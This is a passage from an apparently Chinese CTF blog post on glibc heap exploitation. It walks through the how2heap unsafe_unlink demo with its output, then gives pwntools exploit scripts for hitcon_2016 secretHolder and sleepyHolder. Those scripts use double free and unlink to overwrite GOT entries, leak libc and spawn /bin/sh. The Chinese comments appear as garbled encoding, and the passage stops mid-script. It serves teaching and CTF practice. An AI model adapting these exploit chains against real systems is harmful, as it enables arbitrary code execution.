pçš„æ£€æŸ¥ï¼Œæ³¨æ„è¿™é‡Œæ˜¯ptr0æŒ‡é’ˆçš„åœ°å€å‡å»å¯¹åº”çš„å€¼</span><br>chunk0_ptr[<span class="hljs-number">3</span>] = (<span class="hljs-type">uint64_t</span>) &amp;chunk0_ptr-(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>)*<span class="hljs-number">2</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Fake chunk fd: %p\n&quot;</span>,(<span class="hljs-type">void</span>*) chunk0_ptr[<span class="hljs-number">2</span>]);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Fake chunk bk: %p\n\n&quot;</span>,(<span class="hljs-type">void</span>*) chunk0_ptr[<span class="hljs-number">3</span>]);<br><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n&quot;</span>);<br><span class="hljs-comment">// è¿™é‡Œéœ€è¦ä¸€ä¸ªå †æº¢å‡ºï¼Œè®¾ç½®chunk1çš„å¤´ï¼Œchunk1æ˜¯é«˜åœ°å€çš„ä¸€ä¸ªå †å—</span><br><span class="hljs-type">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We shrink the size of chunk0 (saved as &#x27;previous_size&#x27; in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;It&#x27;s important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n&quot;</span>);<br><span class="hljs-comment">// è®¾ç½®chunk1çš„pre_sizeï¼Œè¿™æ ·æ‰èƒ½ä½¿å¾—chunk1æ‰¾åˆ°fake_chunkå»è„±é“¾ï¼Œä»è€Œæ‰¾åˆ°æˆ‘ä»¬ä¼ªé€ çš„fdå’Œbk</span><br>chunk1_hdr[<span class="hljs-number">0</span>] = malloc_size;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;If we had &#x27;normally&#x27; freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n&quot;</span>,(<span class="hljs-type">void</span>*)chunk1_hdr[<span class="hljs-number">0</span>]);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We mark our fake chunk as free by setting &#x27;previous_in_use&#x27; of chunk1 as False.\n\n&quot;</span>);<br><span class="hljs-comment">// è®¾ç½®ä¸Šä¸€ä¸ªå †å—å¤„äºé‡Šæ”¾çŠ¶æ€</span><br>chunk1_hdr[<span class="hljs-number">1</span>] &amp;= ~<span class="hljs-number">1</span>;<br><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n&quot;</span>);<br><br><span class="hljs-built_in">free</span>(chunk1_ptr);<br><span class="hljs-comment">// è¿™æ ·ï¼Œæˆ‘ä»¬chunk0_ptræŒ‡é’ˆçš„åœ°å€é‡Œé¢å­˜å‚¨çš„å°±æ˜¯è¿™ä¸ªåœ°å€å‡å»3ä¸ªå­—èŠ‚å¤„çš„åœ°å€</span><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n&quot;</span>);<br><br><span class="hljs-type">char</span> victim_string[<span class="hljs-number">8</span>];<br><br><span class="hljs-built_in">strcpy</span>(victim_string,<span class="hljs-string">&quot;Hello!~&quot;</span>);<br><br>chunk0_ptr[<span class="hljs-number">3</span>] = (<span class="hljs-type">uint64_t</span>) victim_string;<br><span class="hljs-comment">// ä¿®æ”¹chunk0_ptræŒ‡å‘å­—ç¬¦ä¸²æŒ‡é’ˆ</span><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Original value: %s\n&quot;</span>,victim_string);<br><br>chunk0_ptr[<span class="hljs-number">0</span>] = <span class="hljs-number">0x4141414142424242</span>LL;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;New Value: %s\n&quot;</span>,victim_string);<br><br><br><br><span class="hljs-comment">// sanity check</span><br><br>assert(*(<span class="hljs-type">long</span> *)victim_string == <span class="hljs-number">0x4141414142424242</span>L);<br><br>&#125;<br><br><br>zyy@zyy-virtual-machine:~/pwn/how2heap$ ./unsafe_unlink<br>Welcome to unsafe unlink <span class="hljs-number">2.0</span>!<br>Tested in Ubuntu <span class="hljs-number">14.04</span>/<span class="hljs-number">16.04</span> <span class="hljs-number">64b</span>it.<br>This technique can be used when you have a pointer at a known location to a region you can call unlink on.<br>The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.<br>The point of this exercise is to use <span class="hljs-built_in">free</span> to corrupt the global chunk0_ptr to achieve arbitrary memory write.<br><br>The global chunk0_ptr is at <span class="hljs-number">0x602078</span>, pointing to <span class="hljs-number">0x116c010</span><br>The victim chunk we are going to corrupt is at <span class="hljs-number">0x116c0a0</span><br><br>We create a fake chunk inside chunk0.<br>We setup the <span class="hljs-string">&#x27;next_free_chunk&#x27;</span> (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.<br>We setup the <span class="hljs-string">&#x27;previous_free_chunk&#x27;</span> (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.<br>With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False<br>Fake chunk fd: <span class="hljs-number">0x602060</span><br>Fake chunk bk: <span class="hljs-number">0x602068</span><br><br>We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.<br>We shrink the size of chunk0 (saved as <span class="hljs-string">&#x27;previous_size&#x27;</span> in chunk1) so that <span class="hljs-built_in">free</span> will think that chunk0 starts where we placed our fake chunk.<br>It<span class="hljs-number">&#x27;</span>s important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly<br>If we had <span class="hljs-string">&#x27;normally&#x27;</span> freed chunk0, chunk1.previous_size would have been <span class="hljs-number">0x90</span>, however this is its new value: <span class="hljs-number">0x80</span><br>We mark our fake chunk as <span class="hljs-built_in">free</span> by setting <span class="hljs-string">&#x27;previous_in_use&#x27;</span> of chunk1 as False.<br><br>Now we <span class="hljs-built_in">free</span> chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.<br>You can find the source of the unlink macro at https:<span class="hljs-comment">//sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344</span><br><br>At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.<br>chunk0_ptr is now pointing where we want, we use it to overwrite our victim <span class="hljs-built_in">string</span>.<br>Original value: Hello!~<br>New Value: BBBBAAAA<br></code></pre></td></tr></table></figure><h3 id="unsafe-unlink"><a href="#unsafe-unlink" class="headerlink" title="unsafe_unlink"></a>unsafe_unlink</h3><h4 id="hitcon-2016-secretHolder"><a href="#hitcon-2016-secretHolder" class="headerlink" title="hitcon_2016_secretHolder"></a>hitcon_2016_secretHolder</h4><p>é¢˜ç›®æµç¨‹æ¯”è¾ƒç®€å•ï¼Œæ²¡æœ‰å¼€å¯<code>PIE</code>å¹¶ä¸”æœ‰å…¨å±€å˜é‡ï¼Œåœ¨æ¶ˆé™¤å †å—çš„ä»£ç å—é‡Œæ²¡æœ‰å¯¹å †å—çš„ä½¿ç”¨æƒ…å†µåšåˆ¤æ–­ï¼Œå¯¼è‡´<code>double free</code>ã€‚åœ¨å¼€å§‹åˆ©ç”¨åˆ°äº†<code>fastbin_dup_consolidate</code>çš„æŠ€å·§åˆ¶é€ å †å—é‡å ä½¿å¾—æˆ‘ä»¬èƒ½å¤Ÿä¿®æ”¹å †å—å¤´ï¼Œä¹‹åå°±æ˜¯unlinkçš„æ“ä½œå®ç°ä»»æ„åœ°å€å†™ã€‚</p><p><strong>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬åœ¨åˆ†é…<code>huge</code>è¿™ä¸ªè¶…å¤§å †å—ï¼ˆ0x61A80ï¼‰çš„æ—¶å€™ï¼Œ<code>sysmalloc()</code>å‡½æ•°æ˜¯è°ƒç”¨äº†<code>mmap()</code>æ¥è¿›è¡Œæ‰©å±•å †å—çš„ï¼Œå› ä¸º0x61A80å·²ç»è¶…è¿‡äº†é˜ˆå€¼<code>mp_.mmap_threshold</code>ï¼ˆä¸€èˆ¬ä¸º128KBï¼‰ï¼Œå¯¼è‡´æˆ‘ä»¬çš„å †å—ä¸ç°å­˜çš„å †å—æœ‰ä¸€æ®µåç§»ï¼Œéš¾ä»¥åˆ©ç”¨ï¼Œé‚£å¦‚ä½•è§£å†³ï¼Ÿæˆ‘ä»¬å‘ç°åœ¨libcé‡Šæ”¾ç”±<code>mmap()</code>åˆ†é…çš„å †å—æ—¶ï¼Œä¼šåŠ¨æ€è°ƒæ•´é˜ˆå€¼ï¼Œè¿™é‡Œå¾ˆæ˜æ˜¾æ˜¯è°ƒå¤§äº†é˜ˆå€¼ï¼Œä½¿å¾—ä¸‹ä¸€æ¬¡æˆ‘ä»¬å†æ¬¡è¯·æ±‚<code>huge</code>è¿™ä¸ªå †å—çš„æ—¶å€™ï¼Œå°±ä¼šè·å¾—ä¸å½“å‰å †å—ç´§é‚»çš„å †å—ï¼Œè¾¾åˆ°æˆ‘ä»¬unlinkçš„æ¡ä»¶ã€‚</strong>æºç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (chunk_is_mmapped (p))                       <span class="hljs-comment">/* release mmapped memory. */</span><br>    &#123;<br>      <span class="hljs-comment">/* see if the dynamic brk/mmap threshold needs adjusting */</span><br>      <span class="hljs-keyword">if</span> (!mp_.no_dyn_threshold<br>          &amp;&amp; p-&gt;size &gt; mp_.mmap_threshold<br>          &amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX)<br>        &#123;<br>          mp_.mmap_threshold = chunksize (p);<span class="hljs-comment">// è°ƒæ•´é˜ˆå€¼</span><br>          mp_.trim_threshold = <span class="hljs-number">2</span> * mp_.mmap_threshold;<br>          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="hljs-number">2</span>,<br>                      mp_.mmap_threshold, mp_.trim_threshold);<br>        &#125;<br>      munmap_chunk (p);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>WPå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&quot;./secretHolder_hitcon_2016&quot;</span>)<br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>sd = <span class="hljs-keyword">lambda</span> data : sh.send(data)<br>sda = <span class="hljs-keyword">lambda</span> information, data : sh.sendafter(information, data)<br>sdla = <span class="hljs-keyword">lambda</span> information, data : sh.sendlineafter(information, data)<br><br>small_ptr_addr = <span class="hljs-number">0x6020B0</span><br>big_ptr_addr = <span class="hljs-number">0x6020A0</span><br>elf = ELF(<span class="hljs-string">&#x27;./secretHolder_hitcon_2016&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>free_got = elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">keep</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>, data</span>):<br>    sdla(<span class="hljs-string">&#x27;3. Renew secret&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    sdla(<span class="hljs-string">&#x27;3. Huge secret&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br>    sda(<span class="hljs-string">&#x27;Tell me your secret: &#x27;</span>, data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">wipe</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    sdla(<span class="hljs-string">&#x27;3. Renew secret&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    sdla(<span class="hljs-string">&#x27;3. Huge secret&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">renew</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>, data</span>):<br>    sdla(<span class="hljs-string">&#x27;3. Renew secret&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    sdla(<span class="hljs-string">&#x27;3. Huge secret&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))    <br>    sda(<span class="hljs-string">&#x27;Tell me your secret: &#x27;</span>, data)<br><br>keep(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>wipe(<span class="hljs-number">1</span>)<br>keep(<span class="hljs-number">2</span>, <span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>wipe(<span class="hljs-number">1</span>)     <span class="hljs-comment"># double free:free chunk_2</span><br>keep(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;aaaa&#x27;</span>)     <span class="hljs-comment"># chunk_1,chunk_2 overlapping</span><br>keep(<span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>wipe(<span class="hljs-number">3</span>)<span class="hljs-comment"># change mp_.mmap_threshold</span><br>keep(<span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br><br><span class="hljs-comment"># unlink</span><br>fake_chunk = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x20</span>)<br>fake_chunk += p64(small_ptr_addr - <span class="hljs-number">3</span>*<span class="hljs-number">8</span>) + p64(small_ptr_addr - <span class="hljs-number">2</span>*<span class="hljs-number">8</span>)<br>fake_chunk += p64(<span class="hljs-number">0x20</span>) + p64(<span class="hljs-number">0x61A90</span>)<br>renew(<span class="hljs-number">2</span>, fake_chunk)<br>wipe(<span class="hljs-number">3</span>)<br><br><span class="hljs-comment"># free(big_ptr)-&gt;puts(puts_got)</span><br>payload = p64(<span class="hljs-number">0</span>) + p64(free_got)    <span class="hljs-comment"># big_ptr-&gt;free_got</span><br>payload += p64(<span class="hljs-number">0</span>) + p64(big_ptr_addr)   <span class="hljs-comment"># small_ptr-&gt;big_ptr_addr</span><br>renew(<span class="hljs-number">1</span>, payload)<br>renew(<span class="hljs-number">2</span>, p64(puts_plt))     <span class="hljs-comment"># free_got-&gt;puts_plt</span><br>renew(<span class="hljs-number">1</span>, p64(puts_got))<br><br><span class="hljs-comment"># leak libc_addr</span><br>wipe(<span class="hljs-number">2</span>)<br>sh.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>puts_addr = u64(sh.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>info(<span class="hljs-string">&#x27;puts_addr:&#x27;</span> + <span class="hljs-built_in">hex</span>(puts_addr))<br>libc_base = puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>info(<span class="hljs-string">&#x27;libc_base:&#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>sys_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>str_bin_sh = libc_base + libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>).<span class="hljs-built_in">next</span>()<br><br><span class="hljs-comment"># free(small_ptr)-&gt;system(&#x27;/bin/sh&#x27;)</span><br>payload = p64(str_bin_sh) + p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># big_ptr-&gt;str_bin_sh</span><br>payload += p64(free_got)    <span class="hljs-comment"># small_ptr-&gt;free_got</span><br>renew(<span class="hljs-number">1</span>, payload)<br>renew(<span class="hljs-number">1</span>, p64(sys_addr))<br><br><span class="hljs-comment"># pwn</span><br>wipe(<span class="hljs-number">2</span>)<br>sh.interactive()<br></code></pre></td></tr></table></figure><h4 id="hitcon-2016-sleepyHolder"><a href="#hitcon-2016-sleepyHolder" class="headerlink" title="hitcon_2016_sleepyHolder"></a>hitcon_2016_sleepyHolder</h4><p>ä¸ä¸Šä¸€é“é¢˜ç›®éå¸¸ç›¸ä¼¼ï¼Œä½†æ˜¯<code>huge</code>å †å—ä¸€æ—¦åˆ†é…äº†å°±æ— æ³•å†é‡Šæ”¾ï¼Œåˆ©ç”¨éš¾åº¦é™¡å¢ã€‚è¿™é‡ŒåŒæ ·æ˜¯åˆ©ç”¨äº†<code>fastbin_dump_consolidate</code>æ–¹æ³•æ¥åˆ¶é€ å †å—é‡å ï¼Œä¸æ­¤åŒæ—¶ï¼Œè¿™é‡Œä¹Ÿå­˜åœ¨<code>double free</code>ã€‚</p><p><strong>è¿™é‡Œæˆ‘ä»¬åˆ†é…çš„<code>small</code>å †å—ä¸º0x28ï¼Œå®é™…ä¸Šæ˜¯å­˜åœ¨<code>presize</code>çš„å¤ç”¨ï¼Œåˆ©ç”¨è¿™ç‚¹æˆ‘ä»¬å¯ä»¥ä¿®æ”¹å †å—å¤´ï¼Œä½†æ˜¯å¦‚ä½•ä¿®æ”¹ä¸‹ä¸€ä¸ªå †å—çš„<code>size</code>æ ‡è®°ä½ï¼Ÿéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¸ç®¡æ˜¯åœ¨mallocè¿˜æ˜¯freeæ“ä½œçš„æ—¶å€™ï¼Œå¯¹äºfastbinï¼Œæ˜¯ä¸ä¼šä¿®æ”¹å…¶ä¸‹ä¸€ä¸ªå †å—çš„æ ‡å¿—ä½çš„ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨<code>consolidate</code>å°†<code>samll</code>å †å—æ”¾å…¥unsortedbinä¸­ï¼Œå¹¶ä¸”åˆ©ç”¨<code>double free</code>å†æ¬¡å°†<code>small</code>é“¾å…¥fastbinä¸­ï¼Œè¿™æ ·æˆ‘ä»¬å†æ¬¡ç”³è¯·<code>small</code>å †å—çš„æ—¶å€™å°±æˆåŠŸä¿®æ”¹å…¶ä¸‹ä¸€ä¸ªå †å—çš„æ ‡å¿—ä½ã€‚</strong></p><p>WPå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># from LibcSearcher import *</span><br><br>sh = process(<span class="hljs-string">&quot;./sleepyHolder_hitcon_2016&quot;</span>)<br><span class="hljs-comment"># sh = remote(&quot;node4.buuoj.cn&quot;, 28881)</span><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>sd = <span class="hljs-keyword">lambda</span> data : sh.send(data)<br>sda = <span class="hljs-keyword">lambda</span> information, data : sh.sendafter(information, data)<br>sdla = <span class="hljs-keyword">lambda</span> information, data : sh.sendlineafter(information, data)<br><br>elf = ELF(<span class="hljs-string">&quot;./sleepyHolder_hitcon_2016&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>small_ptr_addr = <span class="hljs-number">0x6020D0</span><br>big_ptr_addr = <span class="hljs-number">0x6020C0</span><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>free_got = elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">keep</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>, data</span>):<br>    sdla(<span class="hljs-string">&#x27;3. Renew secret&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">id</span> == <span class="hljs-number">3</span> :<br>        sdla(<span class="hljs-string">&#x27;3. Keep a huge secret and lock it forever&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br>    <br>    <span class="hljs-keyword">else</span> :<br>        sdla(<span class="hljs-string">&#x27;2. Big secret&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br>    sda(<span class="hljs-string">&#x27;Tell me your secret: &#x27;</span>, data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">wipe</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    sdla(<span class="hljs-string">&#x27;3. Renew secret&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    sdla(<span class="hljs-string">&#x27;2. Big secret&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">renew</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>, data</span>):<br>    sdla(<span class="hljs-string">&#x27;3. Renew secret&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    sdla(<span class="hljs-string">&#x27;2. Big secret&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))    <br>    sda(<span class="hljs-string">&#x27;Tell me your secret: &#x27;</span>, data)<br><br>sdla(<span class="hljs-string">&quot;Waking Sleepy Holder up ...&quot;</span>, <span class="hljs-string">b&#x27;zyy&#x27;</span>)<br>keep(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>keep(<span class="hljs-number">2</span>, <span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>wipe(<span class="hljs-number">1</span>)<br>keep(<span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;aaaa&#x27;</span>)    <span class="hljs-comment"># consolidate</span><br>wipe(<span class="hljs-number">1</span>)     <span class="hljs-comment"># link to fastbin</span><br><br><span class="hljs-comment"># unlink</span><br>fake_chunk = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x20</span>)     <span class="hljs-comment"># fake_size</span><br>fake_chunk += p64(small_ptr_addr - <span class="hljs-number">3</span>*<span class="hljs-number">8</span>)     <span class="hljs-comment"># fake_fd</span><br>fake_chunk += p64(small_ptr_addr - <span class="hljs-number">2</span>*<span class="hljs-number">8</span>)     <span class="hljs-comment"># fake_bk</span><br>fake_chunk += p64(<span class="hljs-number">0x20</span>)     <span class="hljs-comment"># fake_presize</span><br>keep(<span class="hljs-number">1</span>, fake_chunk)<br>wipe(<span class="hljs-number">2</span>)<br><br><span class="hljs-comment"># free(big_ptr)-&gt;puts(puts_got)</span><br>keep(<span class="hljs-number">2</span>, <span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>payload = p64(<span class="hljs-number">0</span>) + p64(free_got)    <span class="hljs-comment"># big_ptr-&gt;free_got</span><br>payload += p64(<span class="hljs-number">0</span>) + p64(big_ptr_addr)   <span class="hljs-comment"># small_ptr-&gt;big_ptr_addr</span><br>renew(<span class="hljs-number">1</span>, payload)<br>renew(<span class="hljs-number">2</span>, p64(puts_plt))     <span class="hljs-comment"># free_got-&gt;puts_plt</span><br>renew(<span class="hljs-number">1</span>, p64(puts_got))<br><br><span class="hljs-comment"># leak libc_addr</span><br>wipe(<span class="hljs-number">2</span>)<br>sh.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>puts_addr = u64(sh.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>info(<span class="hljs-string">&#x27;puts_addr:&#x27;</span> + <span class="hljs-built_in">hex</span>(puts_addr))<br>libc_base = puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-comment"># libc = LibcSearcher(&#x27;puts&#x27;, puts_addr)</span><br><span class="hljs-comment"># libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)</span><br>info(<span class="hljs-string">&#x27;libc_base:&#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>sys_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-comment"># sys_addr = libc_base + libc.dump(&#x27;system&#x27;)</span><br>str_bin_sh = libc_base + libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>).<span class="hljs-built_in">next</span>()<br><span class="hljs-comment"># str_bin_sh = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><br><span class="hljs-comment"># free(small_ptr)-&gt;system(&#x27;/bin/sh&#x27;)</span><br>payload = p64(str_bin_sh) + p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># big_ptr-&gt;str_bin_sh</span><br>payload += p64(free_got)    <span class="hljs-comment"># small_ptr-&gt;free_got</span><br>renew(<span class="hljs-number">1</span>, payload)<br>renew(<span class="hljs-number">1</span>, 